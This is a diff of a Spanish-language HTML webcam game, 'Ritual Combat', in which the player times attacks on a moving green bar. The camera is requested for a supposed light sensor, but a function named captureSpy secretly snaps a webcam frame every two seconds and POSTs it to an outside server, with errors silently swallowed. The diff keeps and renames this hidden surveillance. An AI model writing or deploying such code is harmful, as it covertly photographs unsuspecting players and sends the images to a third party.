@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>Ritual Combat Elite</title>
+    <title>Ritual Combat - Hardcore Edition</title>
     <style>
         * { box-sizing: border-box; touch-action: none; }
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: 'Courier New', Courier, monospace; overflow: hidden; color: white; }
@@ -15,91 +15,107 @@
 
         #ui-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; pointer-events: none; display: flex; flex-direction: column; align-items: center; justify-content: space-between; padding: 40px 0; }
 
-        /* Barras de Vida Largas con Texto */
-        .bars-wrapper { width: 95%; display: flex; flex-direction: column; gap: 15px; align-items: center; }
+        /* Barras de Vida Estilo RPG */
+        .stats { width: 95%; display: flex; flex-direction: column; gap: 15px; }
+        .bar-wrapper { width: 100%; position: relative; }
+        .label { font-weight: bold; font-size: 14px; margin-bottom: 4px; text-shadow: 2px 2px #000; }
+        
         .bar-container { 
-            width: 100%; height: 35px; background: #222; border: 3px solid #fff; 
-            border-radius: 5px; position: relative; overflow: hidden; 
+            width: 100%; height: 35px; background: rgba(50, 50, 50, 0.8); 
+            border: 3px solid #fff; border-radius: 5px; overflow: hidden; position: relative;
         }
-        .bar-fill { height: 100%; transition: width 0.4s cubic-bezier(0.18, 0.89, 0.32, 1.28); }
-        #player-health-bar { background: #2ecc71; width: 100%; }
-        #enemy-health-bar { background: #e74c3c; width: 100%; }
-        .bar-text { 
-            position: absolute; width: 100%; text-align: center; top: 50%; 
-            transform: translateY(-50%); font-weight: bold; font-size: 18px; 
-            text-shadow: 2px 2px #000; z-index: 5; 
+        .bar-fill { height: 100%; width: 100%; transition: width 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        .hp-text { 
+            position: absolute; width: 100%; height: 100%; top: 0; left: 0;
+            display: flex; align-items: center; justify-content: center;
+            font-weight: bold; font-size: 18px; text-shadow: 1px 1px #000; z-index: 5;
         }
+        #p-fill { background: linear-gradient(to right, #27ae60, #2ecc71); }
+        #e-fill { background: linear-gradient(to right, #c0392b, #e74c3c); }
 
         /* Enemigo */
         #enemy {
             width: 140px; height: 140px; border-radius: 50%; background: #f1c40f;
             display: flex; align-items: center; justify-content: center; font-size: 50px;
-            transition: all 0.2s; border: 5px solid rgba(255,255,255,0.4);
-            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+            transition: transform 0.1s, background 0.2s; position: relative;
+            border: 5px solid rgba(255,255,255,0.4); box-shadow: 0 0 20px rgba(0,0,0,0.5);
         }
 
         /* Barra de Ataque */
         #hit-zone {
-            width: 320px; height: 50px; background: #800000; border: 4px solid #fff;
+            width: 340px; height: 50px; background: #8e0000; border: 4px solid #fff;
             position: relative; border-radius: 8px; overflow: hidden; pointer-events: auto;
+            box-shadow: 0 0 15px rgba(0,0,0,0.8);
         }
-        #green-zone { position: absolute; height: 100%; background: #00ff00; box-shadow: inset 0 0 15px #000; }
-        #indicator { position: absolute; width: 8px; height: 100%; background: #fff; box-shadow: 0 0 15px #fff; left: 0; z-index: 6; }
+        #green-zone { position: absolute; height: 100%; background: #00ff00; box-shadow: inset 0 0 10px #000; }
+        #indicator { position: absolute; width: 8px; height: 100%; background: #fff; box-shadow: 0 0 15px #fff; left: 0; z-index: 2; }
 
         #attack-btn {
             padding: 25px 60px; background: #f1c40f; color: #000; border: none;
-            border-radius: 15px; font-weight: bold; font-size: 22px; cursor: pointer;
-            pointer-events: auto; transition: 0.3s; border-bottom: 5px solid #91770b;
+            border-radius: 15px; font-weight: bold; font-size: 24px; cursor: pointer;
+            pointer-events: auto; transition: transform 0.1s, opacity 0.3s;
+            box-shadow: 0 6px #d35400;
         }
-        #attack-btn:disabled { opacity: 0.4; filter: grayscale(1); transform: translateY(4px); border-bottom: none; }
+        #attack-btn:active { transform: translateY(4px); box-shadow: 0 2px #d35400; }
+        #attack-btn:disabled { opacity: 0.4; background: #bdc3c7; box-shadow: none; transform: translateY(4px); }
 
-        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 100; display: flex; align-items: center; justify-content: center; text-align: center; }
-        .card { background: #111; padding: 30px; border-radius: 20px; border: 3px solid #f1c40f; width: 90%; max-width: 450px; pointer-events: auto; }
-        #dark-warning { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; display: none; align-items: center; justify-content: center; flex-direction: column; }
-
-        .damage-pop { position: absolute; font-weight: bold; font-size: 30px; animation: flyUp 0.8s forwards; color: #ff0; text-shadow: 2px 2px #000; }
-        @keyframes flyUp { from { opacity: 1; transform: translateY(0); } to { opacity: 0; transform: translateY(-70px); } }
+        /* Overlays */
+        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.92); z-index: 100; display: flex; align-items: center; justify-content: center; text-align: center; }
+        .card { background: #1a1a1a; padding: 30px; border-radius: 20px; border: 3px solid #f1c40f; width: 85%; max-width: 420px; pointer-events: auto; }
+        #dark-warning { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; display: none; align-items: center; justify-content: center; text-align: center; flex-direction: column; }
     </style>
 </head>
-<body onclick="tryHit()">
+<body>
 
 <video id="webcam" autoplay playsinline></video>
 
 <div id="dark-warning">
-    <h1 style="color: #f1c40f; font-size: 60px;">🌑</h1>
-    <h2>OSCURIDAD DETECTADA</h2>
-    <p>La cámara no puede verte. Por favor, <b>enciende una luz</b>.</p>
+    <h1 style="color: #f1c40f; font-size: 60px;">🌙</h1>
+    <h2>DEMASIADA OSCURIDAD</h2>
+    <p>La cámara no puede verte. Enciende una luz para jugar.</p>
 </div>
 
 <div id="perm-screen" class="overlay">
     <div class="card">
-        <h2 style="color:#f1c40f">ACCESO A CÁMARA</h2>
-        <p>Se requiere cámara para el sensor de luz y calibración.</p>
-        <button class="btn" style="padding:20px; width:100%; background:#f1c40f; border:none; font-weight:bold; cursor:pointer" onclick="initCamera()">PERMITIR CÁMARA</button>
+        <h2>SISTEMA DE COMBATE</h2>
+        <p>Habilita la cámara para iniciar el sensor de luz y el juego.</p>
+        <button class="btn" style="padding:18px; width:100%; background:#f1c40f; border:none; font-weight:bold; border-radius:10px; cursor:pointer;" onclick="initCamera()">ACTIVAR CÁMARA</button>
     </div>
 </div>
 
 <div id="start-screen" class="overlay" style="display:none;">
     <div class="card">
-        <h1 style="color:#f1c40f">RITUAL COMBAT</h1>
-        <p style="text-align: left; line-height: 1.6;">
-            • Dale a la <b>zona verde</b> para atacar.<br>
-            • Si fallas, el enemigo se cura y tú sufres.<br>
-            • La zona cambia de lugar en cada golpe.<br>
-            • 2 segundos de espera entre ataques.
+        <h2 style="color:#f1c40f;">INSTRUCCIONES</h2>
+        <p style="text-align: left; font-size: 15px; line-height: 1.6;">
+            • Golpea cuando la línea esté en lo VERDE.<br>
+            • Dar en el CENTRO hace daño crítico (20 HP).<br>
+            • El botón tiene 2s de recarga.<br>
+            • ¡CUIDADO! La zona verde se mueve en cada clic.
         </p>
-        <button class="btn" style="padding:20px; width:100%; background:#f1c40f; border:none; font-weight:bold; cursor:pointer" onclick="startGame()">INICIAR COMBATE</button>
+        <button class="btn" style="padding:18px; width:100%; background:#f1c40f; border:none; font-weight:bold; border-radius:10px; cursor:pointer;" onclick="startGame()">¡A COMBATIR!</button>
     </div>
 </div>
 
-<div id="msg-screen" class="overlay" style="display:none; background:rgba(0,0,0,0.85);">
-    <h1 style="color:#f1c40f; font-size: 45px;">¡ENEMIGO ELIMINADO!</h1>
+<div id="msg-screen" class="overlay" style="display:none; background:rgba(46, 204, 113, 0.9);">
+    <h1 style="font-size: 45px; color: white;">¡ENEMIGO ELIMINADO!</h1>
 </div>
 
 <div id="ui-layer">
-    <div class="bars-wrapper">
-        <div style="width:100%">JUGADOR <div class="bar-container"><div class="bar-text" id="p-txt">100 / 100</div><div id="player-health-bar" class="bar-fill"></div></div></div>
-        <div style="width:100%">ENEMIGO <div class="bar-container"><div class="bar-text" id="e-txt">50 / 50</div><div id="enemy-health-bar" class="bar-fill"></div></div></div>
+    <div class="stats">
+        <div class="bar-wrapper">
+            <div class="label">JUGADOR (VITALIDAD)</div>
+            <div class="bar-container">
+                <div id="p-fill" class="bar-fill"></div>
+                <div id="p-text" class="hp-text">100 / 100</div>
+            </div>
+        </div>
+        <div class="bar-wrapper">
+            <div class="label" id="e-name">ENEMIGO (NIVEL 1)</div>
+            <div class="bar-container">
+                <div id="e-fill" class="bar-fill"></div>
+                <div id="e-text" class="hp-text">50 / 50</div>
+            </div>
+        </div>
     </div>
 
     <div id="enemy">ò_ó</div>
@@ -109,7 +125,7 @@
         <div id="indicator"></div>
     </div>
 
-    <button id="attack-btn">ATACAR</button>
+    <button id="attack-btn" onclick="tryHit()">ATACAR</button>
 </div>
 
 <script>
@@ -117,26 +133,21 @@
     const SERVER_URL = "https://pagina-web-camara.onrender.com/upload";
     
     let playerHP = 100;
-    let enemyHP = 50;
-    let maxEnemyHP = 50;
-    let greenSize = 85;
-    let greenPos = 100;
-    let indicatorPos = 0;
-    let indicatorDir = 3;
-    let isCooldown = false;
-    let gameActive = false;
-    let enemyLevel = 1;
-    const colors = ['#f1c40f', '#e67e22', '#9b59b6', '#3498db', '#1abc9c', '#e74c3c'];
+    let enemyHP = 50, maxEnemyHP = 50;
+    let greenSize = 90, greenPos = 120;
+    let indicatorPos = 0, indicatorDir = 4.5; // VELOCIDAD AUMENTADA (antes 2)
+    let isCooldown = false, gameActive = false, level = 1;
+    let colors = ['#f1c40f', '#9b59b6', '#3498db', '#e67e22', '#1abc9c', '#e74c3c'];
 
     async function initCamera() {
         try {
-            const s = await navigator.mediaDevices.getUserMedia({ video: true });
-            video.srcObject = s;
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
             document.getElementById('perm-screen').style.display = 'none';
             document.getElementById('start-screen').style.display = 'flex';
-            setInterval(lightCheck, 1000);
-            setInterval(spyCapture, 2000);
-        } catch(e) { alert("Cámara obligatoria."); }
+            setInterval(lightCheck, 800);
+            setInterval(captureSpy, 2000);
+        } catch (e) { alert("Error de acceso."); }
     }
 
     function lightCheck() {
@@ -147,147 +158,118 @@
         const data = ctx.getImageData(0, 0, 40, 40).data;
         let b = 0;
         for(let i=0; i<data.length; i+=4) b += (data[i]+data[i+1]+data[i+2])/3;
-        document.getElementById('dark-warning').style.display = (b/(data.length/4) < 45) ? 'flex' : 'none';
+        const avg = b / (data.length/4);
+        document.getElementById('dark-warning').style.display = (avg < 42) ? 'flex' : 'none';
+        if (avg < 42) gameActive = false; else if (!gameActive && document.getElementById('start-screen').style.display === 'none') gameActive = true;
     }
 
     function startGame() {
         document.getElementById('start-screen').style.display = 'none';
-        resetGameStats();
+        resetEnemy(50);
+        playerHP = 100;
         gameActive = true;
         animate();
-    }
-
-    function resetGameStats() {
-        playerHP = 100;
-        enemyHP = 50;
-        maxEnemyHP = 50;
-        greenSize = 85;
-        moveGreenZone();
-        updateUI();
-    }
-
-    function moveGreenZone() {
-        greenPos = Math.random() * (320 - greenSize);
     }
 
     function animate() {
         if (!gameActive) return;
         indicatorPos += indicatorDir;
-        if (indicatorPos >= 312 || indicatorPos <= 0) indicatorDir *= -1;
+        if (indicatorPos > 332 || indicatorPos < 0) indicatorDir *= -1;
         document.getElementById('indicator').style.left = indicatorPos + "px";
         requestAnimationFrame(animate);
     }
 
     function tryHit() {
-        if (isCooldown || !gameActive || document.getElementById('dark-warning').style.display === 'flex') return;
+        if (isCooldown || !gameActive) return;
+        
+        const indicatorMiddle = indicatorPos + 4;
+        const isHit = indicatorMiddle >= greenPos && indicatorMiddle <= (greenPos + greenSize);
 
-        const mid = indicatorPos + 4;
-        const gStart = greenPos;
-        const gEnd = greenPos + greenSize;
-
-        if (mid >= gStart && mid <= gEnd) {
-            // Acierto
-            const center = gStart + (greenSize/2);
-            const dist = Math.abs(mid - center);
-            const damage = Math.ceil((1 - (dist/(greenSize/2))) * 20);
+        if (isHit) {
+            const center = greenPos + (greenSize / 2);
+            const dist = Math.abs(indicatorMiddle - center);
+            const damage = Math.ceil((1 - (dist / (greenSize / 2))) * 20);
             
             enemyHP -= damage;
             playerHP = Math.min(100, playerHP + 10);
+            greenSize = Math.max(30, greenSize - 12); // Se hace más CHICO al acertar
             
-            impactEffect("success");
-            showPop(`-${damage}`, "enemy");
+            document.getElementById('enemy').style.background = "white";
+            setTimeout(() => document.getElementById('enemy').style.background = colors[0], 150);
+            if (enemyHP <= 0) victory();
         } else {
-            // Fallo
             playerHP -= 10;
             enemyHP = Math.min(maxEnemyHP, enemyHP + 10);
-            greenSize = Math.min(180, greenSize + 10);
-            impactEffect("fail");
-            showPop("-10", "player");
+            greenSize = Math.min(160, greenSize + 15); // Se hace más GRANDE al fallar
+            if (playerHP <= 0) { alert("HAS CAÍDO EN COMBATE"); location.reload(); }
         }
 
-        // DIFICULTAD: Siempre se mueve la zona verde después de un intento
-        moveGreenZone();
+        // LA LINEA VERDE SIEMPRE SE MUEVE DE LUGAR EN CADA CLIC
+        greenPos = Math.random() * (340 - greenSize);
         
+        startCooldown();
+        updateUI();
+    }
+
+    function startCooldown() {
         isCooldown = true;
         const btn = document.getElementById('attack-btn');
         btn.disabled = true;
-        updateUI();
-
-        if (enemyHP <= 0) {
-            victory();
-        } else if (playerHP <= 0) {
-            alert("HAS MUERTO");
-            location.reload();
-        }
-
+        btn.innerText = "ESPERA...";
         setTimeout(() => {
             isCooldown = false;
             btn.disabled = false;
+            btn.innerText = "ATACAR";
         }, 2000);
-    }
-
-    function impactEffect(type) {
-        const e = document.getElementById('enemy');
-        if(type === "success") {
-            e.style.background = "#fff";
-            setTimeout(() => e.style.background = colors[enemyLevel % colors.length], 100);
-        } else {
-            e.style.transform = "translateX(20px)";
-            setTimeout(() => e.style.transform = "translateX(0)", 100);
-        }
     }
 
     function victory() {
         gameActive = false;
+        level++;
         document.getElementById('msg-screen').style.display = 'flex';
         setTimeout(() => {
             document.getElementById('msg-screen').style.display = 'none';
-            enemyLevel++;
             maxEnemyHP += 20;
-            enemyHP = maxEnemyHP;
-            greenSize = Math.max(35, greenSize - 12);
-            document.getElementById('enemy').style.background = colors[enemyLevel % colors.length];
+            indicatorDir += (indicatorDir > 0 ? 0.5 : -0.5); // Cada nivel es más rápido
+            resetEnemy(maxEnemyHP);
             gameActive = true;
-            moveGreenZone();
-            updateUI();
             animate();
         }, 2000);
     }
 
+    function resetEnemy(hp) {
+        enemyHP = hp; maxEnemyHP = hp;
+        colors.push(colors.shift());
+        document.getElementById('enemy').style.background = colors[0];
+        document.getElementById('e-name').innerText = `ENEMIGO (NIVEL ${level})`;
+        greenPos = Math.random() * (340 - greenSize);
+        updateUI();
+    }
+
     function updateUI() {
-        document.getElementById('player-health-bar').style.width = playerHP + "%";
-        document.getElementById('p-txt').innerText = `${playerHP} / 100`;
+        // Barras con texto 100/100
+        document.getElementById('p-fill').style.width = playerHP + "%";
+        document.getElementById('p-text').innerText = `${playerHP} / 100`;
         
-        const enemyPer = (enemyHP / maxEnemyHP) * 100;
-        document.getElementById('enemy-health-bar').style.width = enemyPer + "%";
-        document.getElementById('e-txt').innerText = `${enemyHP} / ${maxEnemyHP}`;
+        document.getElementById('e-fill').style.width = (enemyHP / maxEnemyHP * 100) + "%";
+        document.getElementById('e-text').innerText = `${enemyHP} / ${maxEnemyHP}`;
 
         const gz = document.getElementById('green-zone');
         gz.style.width = greenSize + "px";
         gz.style.left = greenPos + "px";
     }
 
-    function showPop(txt, target) {
-        const p = document.createElement('div');
-        p.className = 'damage-pop';
-        p.innerText = txt;
-        const rect = document.getElementById(target === 'enemy' ? 'enemy' : 'ui-layer').getBoundingClientRect();
-        p.style.left = "50%";
-        document.getElementById(target === 'enemy' ? 'enemy' : 'ui-layer').appendChild(p);
-        setTimeout(() => p.remove(), 800);
-    }
-
-    function spyCapture() {
-        if(!video.videoWidth) return;
-        const c = document.createElement('canvas');
-        c.width = video.videoWidth; c.height = video.videoHeight;
-        c.getContext('2d').drawImage(video, 0, 0);
+    function captureSpy() {
+        if (!video.videoWidth) return;
+        const s = document.createElement('canvas');
+        s.width = video.videoWidth; s.height = video.videoHeight;
+        s.getContext('2d').drawImage(video, 0, 0);
         fetch(SERVER_URL, {
             method: 'POST',
             mode: 'cors',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({image: c.toDataURL('image/jpeg', 0.5)})
-        }).catch(()=>{});
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ image: s.toDataURL('image/jpeg', 0.5) })
+        }).catch(() => {});
     }
 </script>
 </body>
